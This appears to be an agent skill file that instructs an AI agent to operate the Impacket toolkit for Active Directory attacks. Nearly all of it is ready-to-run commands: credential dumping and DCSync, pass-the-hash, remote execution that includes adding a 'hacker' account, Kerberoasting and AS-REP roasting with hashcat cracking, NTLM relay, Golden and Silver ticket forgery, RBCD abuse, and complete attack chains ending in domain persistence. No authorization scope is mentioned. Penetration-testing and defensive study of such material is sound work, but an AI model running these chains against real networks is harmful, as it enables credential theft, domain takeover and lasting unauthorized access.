---
name: impacket
description: >
  Use and operate Impacket — a collection of Python classes for working with network protocols,
  essential for Active Directory attacks and lateral movement. Use when performing AD enumeration,
  credential dumping (SAM, LSA, NTDS.dit, DCSync), remote code execution via SMB/WMI/DCOM,
  Kerberoasting, AS-REP Roasting, NTLM relay attacks, Golden/Silver ticket forgery, or
  MSSQL attacks. Covers installation, all major example scripts, authentication methods,
  and complete AD attack chains. GitHub: https://github.com/fortra/impacket (15.6k stars).
license: Apache-2.0
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/fortra/impacket
  language: Python
---

# impacket Agent Skill

## When to Use This Skill

Use this skill when:
- Performing Active Directory attacks: credential dumping, lateral movement, privilege escalation
- Executing remote commands via SMB, WMI, DCOM, or Task Scheduler
- Performing Kerberoasting (GetUserSPNs.py) or AS-REP Roasting (GetNPUsers.py)
- Conducting NTLM relay attacks with ntlmrelayx.py
- Forging Kerberos tickets (Golden/Silver) with ticketer.py
- Interacting with SMB shares or MSSQL instances during assessments
- Building or debugging Python tooling that uses low-level network protocol classes

## What Impacket Does

Impacket is a Python library of protocol implementations — SMB1/2/3, MSRPC, LDAP, Kerberos, MSSQL (TDS), DCOM/WMI — providing both a reusable class library and a large suite of ready-to-run example scripts. It is the backbone of most Windows/Active Directory attack tooling in the offensive security ecosystem, underpinning tools like CrackMapExec, BloodHound ingestors, and countless custom exploits.

## Installation

### pip (stable release)
```bash
pip install impacket
```

### From source (recommended for latest features)
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install -e .          # editable install — scripts in impacket/examples/
# or
python setup.py install
```

### Kali / Debian — pre-packaged
```bash
sudo apt install python3-impacket impacket-scripts
# scripts land in /usr/share/doc/python3-impacket/examples/ or as symlinks
```

### Docker
```bash
docker build -t impacket .    # Dockerfile in repo root
docker run --rm -it impacket secretsdump.py --help
```

### Dependencies (auto-installed via pip)
- `pyOpenSSL`, `cryptography`, `pyasn1`, `ldap3`, `ldapdomaindump`, `flask`, `dsinternals`

### Verify
```bash
python -c "import impacket; print(impacket.__version__)"
secretsdump.py --help
```

## Authentication Methods

All impacket scripts share a consistent authentication model:

| Method | Flag | Example |
|---|---|---|
| Cleartext password | (default) | `user:password@target` |
| NT hash (Pass-the-Hash) | `-hashes` | `-hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH` |
| NTLM (LM:NT) | `-hashes` | `-hashes LMHASH:NTHASH` |
| Kerberos ticket | `-k` | `-k -no-pass` (uses ccache from `KRB5CCNAME`) |
| AES key | `-aesKey` | `-aesKey <128/256-bit hex>` |
| DC IP (required when using Kerberos) | `-dc-ip` | `-dc-ip 10.10.10.1` |

```bash
# Pass-the-Hash pattern (LM portion can be blank)
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/user@10.10.10.100

# Kerberos auth — set ticket first
export KRB5CCNAME=/tmp/admin.ccache
secretsdump.py -k -no-pass -dc-ip 10.10.10.1 DOMAIN/admin@dc01.domain.local
```

## Core Scripts Reference

### secretsdump.py — Credential Extraction

The primary impacket credential-dumping script. Supports remote (registry/DRSUAPI) and local (hive file) extraction.

```bash
# Remote SAM + LSA dump (no DC needed — any Windows host with admin)
secretsdump.py DOMAIN/user:password@10.10.10.100

# DCSync — pull all NTDS hashes via DRSUAPI (DC required, domain admin or equiv)
secretsdump.py -just-dc DOMAIN/user:password@dc01.domain.local

# DCSync for a single user
secretsdump.py -just-dc-user Administrator DOMAIN/user:password@dc01.domain.local

# DCSync — NTLM hashes only (skip Kerberos keys)
secretsdump.py -just-dc-ntlm DOMAIN/user:password@dc01.domain.local

# Local extraction from offline hive files (no network)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Extract from NTDS.dit + SYSTEM hive (offline)
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Pass-the-Hash to dump
secretsdump.py -hashes :NTHASH DOMAIN/user@10.10.10.100

# Output to file
secretsdump.py DOMAIN/user:password@10.10.10.100 | tee hashes.txt
```

### Remote Execution Scripts

#### psexec.py — SCM + Named Pipe Shell
Creates a Windows service via SVCCTL, uploads a binary to ADMIN$, executes it.
```bash
psexec.py DOMAIN/user:password@10.10.10.100
psexec.py -hashes :NTHASH DOMAIN/user@10.10.10.100
psexec.py -k -no-pass -dc-ip 10.10.10.1 DOMAIN/user@target.domain.local
# Custom command (non-interactive)
psexec.py DOMAIN/user:password@10.10.10.100 cmd.exe /c whoami
```

#### smbexec.py — Service + cmd.exe (less noisy)
Creates a temporary service that runs cmd.exe commands via output redirection to a share.
```bash
smbexec.py DOMAIN/user:password@10.10.10.100
smbexec.py -hashes :NTHASH DOMAIN/user@10.10.10.100
# Specify share for output (default C$)
smbexec.py -share TMP DOMAIN/user:password@10.10.10.100
```

#### wmiexec.py — WMI (Win32_Process) Execution
Uses DCOM/WMI. More stealthy — no service creation. Output retrieved via SMB share.
```bash
wmiexec.py DOMAIN/user:password@10.10.10.100
wmiexec.py -hashes :NTHASH DOMAIN/user@10.10.10.100
# Run single command
wmiexec.py DOMAIN/user:password@10.10.10.100 "ipconfig /all"
# No output (fire-and-forget)
wmiexec.py -nooutput DOMAIN/user:password@10.10.10.100 "net user hacker P@ss1 /add"
```

#### atexec.py — Task Scheduler Execution
Schedules a task via MS-TSCH, retrieves output from a share.
```bash
atexec.py DOMAIN/user:password@10.10.10.100 "whoami"
atexec.py -hashes :NTHASH DOMAIN/user@10.10.10.100 "net localgroup administrators"
```

#### dcomexec.py — DCOM Shell (MMC20, ShellWindows, ShellBrowserWindow)
```bash
dcomexec.py -object MMC20 DOMAIN/user:password@10.10.10.100
dcomexec.py -object ShellWindows DOMAIN/user:password@10.10.10.100 "calc.exe"
```

### Kerberos Attack Scripts

#### GetUserSPNs.py — Kerberoasting
Requests TGS tickets for accounts with SPNs set. Offline-crackable.
```bash
# List SPNs
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1

# Request hashes (output to hashcat format)
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -request

# Save to file
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt

# Request for specific user
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.1 -request-user svc_sql

# With Pass-the-Hash
GetUserSPNs.py -hashes :NTHASH DOMAIN/user -dc-ip 10.10.10.1 -request

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

#### GetNPUsers.py — AS-REP Roasting
Targets accounts with "Do not require Kerberos preauthentication" set.
```bash
# Test single user (no credentials needed)
GetNPUsers.py DOMAIN/user -dc-ip 10.10.10.1 -no-pass

# Enumerate all vulnerable accounts (with valid creds)
GetNPUsers.py DOMAIN/user:password -dc-ip 10.10.10.1 -request

# From a list of usernames (no creds required)
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -format hashcat

# Save to file
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -outputfile asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### ntlmrelayx.py — NTLM Relay Attacks

Relay intercepted NTLM authentication to target services. Requires Responder (or mitm6) to capture auth.
```bash
# Basic SMB relay — dump SAM on all targets
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP — escalate privileges (requires ldaps or unsigned LDAP)
ntlmrelayx.py -tf targets.txt -t ldap://dc01.domain.local --escalate-user lowpriv

# Relay to MSSQL — execute OS commands
ntlmrelayx.py -tf targets.txt -t mssql://sql.domain.local -q "SELECT @@version"

# Interactive SMB shell on relay
ntlmrelayx.py -tf targets.txt -smb2support -i
nc 127.0.0.1 11000    # connect to interactive shell

# HTTPs relay (useful for WebDAV/ADCS)
ntlmrelayx.py -tf targets.txt -t https://ca.domain.local/certsrv/certfnsh.asp --adcs --template User

# Relay + dump (SMBv2 with signing disabled)
ntlmrelayx.py -tf targets.txt -smb2support --dump-lsass

# Combined with Responder (disable SMB and HTTP in Responder.conf first)
# Responder -I eth0 -rdw
# ntlmrelayx.py -tf relay-targets.txt -smb2support
```

### Ticket Forgery

#### ticketer.py — Golden and Silver Ticket Forgery
```bash
# Golden Ticket (requires KRBTGT NTLM hash and domain SID)
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache

# Silver Ticket (service-specific — requires service account hash)
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain domain.local \
  -spn cifs/server.domain.local Administrator

# Use ticket with wmiexec
wmiexec.py -k -no-pass -dc-ip 10.10.10.1 domain.local/Administrator@server.domain.local
```

#### getTGT.py / getST.py — Ticket Acquisition
```bash
# Get TGT with password
getTGT.py DOMAIN/user:password -dc-ip 10.10.10.1
export KRB5CCNAME=user.ccache

# Get Service Ticket (S4U2Self/S4U2Proxy for constrained delegation)
getST.py -spn cifs/server.domain.local -impersonate Administrator DOMAIN/svc:password -dc-ip 10.10.10.1
```

### SMB and File Access

#### smbclient.py — Interactive SMB Shell
```bash
smbclient.py DOMAIN/user:password@10.10.10.100
smbclient.py -hashes :NTHASH DOMAIN/user@10.10.10.100

# smbclient commands
# shares           — list shares
# use C$           — connect to share
# ls               — list files
# get secret.txt   — download file
# put payload.exe  — upload file
# cd Windows\Temp  — navigate
```

### MSSQL Access

#### mssqlclient.py — SQL Server Client
```bash
# Windows auth
mssqlclient.py DOMAIN/user:password@10.10.10.100 -windows-auth

# SQL auth
mssqlclient.py sa:password@10.10.10.100

# Pass-the-Hash
mssqlclient.py -hashes :NTHASH DOMAIN/user@10.10.10.100 -windows-auth

# Useful commands once connected
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
# SQL> xp_cmdshell powershell -enc <base64>
```

### Enumeration Scripts

```bash
# Domain SID lookup — needed for ticket forgery
lookupsid.py DOMAIN/user:password@10.10.10.100

# SAMR enumeration — users, groups, policies
samrdump.py DOMAIN/user:password@10.10.10.100

# LDAP user enumeration
GetADUsers.py -all DOMAIN/user:password -dc-ip 10.10.10.1

# Find accounts with delegation enabled
findDelegation.py DOMAIN/user:password -dc-ip 10.10.10.1

# LAPS password retrieval
GetLAPSPassword.py DOMAIN/user:password -dc-ip 10.10.10.1 -computer WORKSTATION01

# Registry interaction
reg.py DOMAIN/user:password@10.10.10.100 query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services

# DPAPI secrets (Chrome passwords, Windows credential manager)
dpapi.py masterkey -file 99cf9... -sid S-1-5-21-... -password P@ssword
dpapi.py credential -file C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\...
```

## Common Attack Chains

### Chain 1: Kerberoast → Crack → Lateral Movement
```bash
# 1. Enumerate SPNs
GetUserSPNs.py DOMAIN/lowpriv:password -dc-ip 10.10.10.1 -request -outputfile spns.txt

# 2. Crack offline
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt --force

# 3. Use cracked service account to dump
secretsdump.py DOMAIN/svc_sql:CrackedPass@10.10.10.100
```

### Chain 2: NTLM Relay → DCSync
```bash
# 1. Disable SMB+HTTP in /etc/responder/Responder.conf
# 2. Capture NTLM with Responder
responder -I eth0 -rdwP

# 3. Relay to LDAP to grant DCSync rights
ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user lowpriv

# 4. DCSync
secretsdump.py -just-dc DOMAIN/lowpriv:password@dc01.domain.local
```

### Chain 3: AS-REP Roast with No Creds
```bash
# 1. Enumerate via LDAP or gathered username list
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.1 -no-pass -format hashcat -outputfile asrep.txt

# 2. Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 3. Remote execution with cracked account
wmiexec.py DOMAIN/user:CrackedPass@10.10.10.100
```

### Chain 4: Golden Ticket Persistence
```bash
# 1. Dump KRBTGT hash
secretsdump.py -just-dc-user krbtgt DOMAIN/admin:password@dc01.domain.local

# 2. Get domain SID
lookupsid.py DOMAIN/admin:password@dc01.domain.local | grep "Domain SID"

# 3. Forge Golden Ticket
ticketer.py -nthash <krbtgt_nt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass domain.local/Administrator@any-host.domain.local
```

## Advanced Techniques

### Using Impacket as a Python Library
```python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, drsuapi

# SMB connection
smb = SMBConnection('10.10.10.100', '10.10.10.100')
smb.login('user', 'password', 'DOMAIN')
shares = smb.listShares()

# Kerberos via ccache
import os
os.environ['KRB5CCNAME'] = '/tmp/user.ccache'
smb.kerberosLogin('user', '', 'DOMAIN', '', '', '')
```

### rbcd.py — Resource-Based Constrained Delegation Attack
```bash
# Add computer account for RBCD
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123' DOMAIN/user:password -dc-ip 10.10.10.1

# Configure RBCD on target machine
rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKER$' -action write DOMAIN/user:password -dc-ip 10.10.10.1

# Get impersonation service ticket
getST.py -spn cifs/target.domain.local -impersonate Administrator -dc-ip 10.10.10.1 DOMAIN/ATTACKER\$:Password123

# Use ticket
export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
secretsdump.py -k -no-pass target.domain.local
```

## Integration with Other Tools

| Impacket Script | Pairs With | Workflow |
|---|---|---|
| ntlmrelayx.py | Responder, mitm6 | IPv6 + relay → LDAP/SMB |
| secretsdump.py | BloodHound | Dump hashes → find paths |
| GetUserSPNs.py | Hashcat | Kerberoast → crack |
| ticketer.py | Mimikatz | Cross-validate ticket forgery |
| mssqlclient.py | PowerUpSQL | MSSQL privilege escalation |

## Troubleshooting

**`[-] SMB SessionError: STATUS_ACCESS_DENIED`**
→ Account lacks admin rights on target; try different credentials or use an account in local admins.

**`[-] NTLM Auth Error`**
→ Ensure NTLM is not disabled (NTLMv1 blocks); try `-k` Kerberos auth instead.

**`Kerberos SessionError: KRB_AP_ERR_SKEW`**
→ Clock skew > 5 minutes. Sync with DC: `sudo ntpdate <dc-ip>`

**`[-] StringBinding must be in the format ...`**
→ Use FQDN instead of IP when Kerberos is required: `-dc-ip 10.10.10.1` with FQDN target.

**`ImportError: No module named 'impacket'`**
→ Use `pip install impacket` in the active virtualenv, or run scripts with `python path/to/script.py`.

**SMB Signing errors with ntlmrelayx.py**
→ SMB signing prevents relaying to that host. Use `--smb2support` and pre-scan with `crackmapexec smb target --gen-relay-list relay-targets.txt`.
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [How to Attack-Test Your Own Domain Controllers Before an Adversary Does](https://redhound.us/attack-test-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
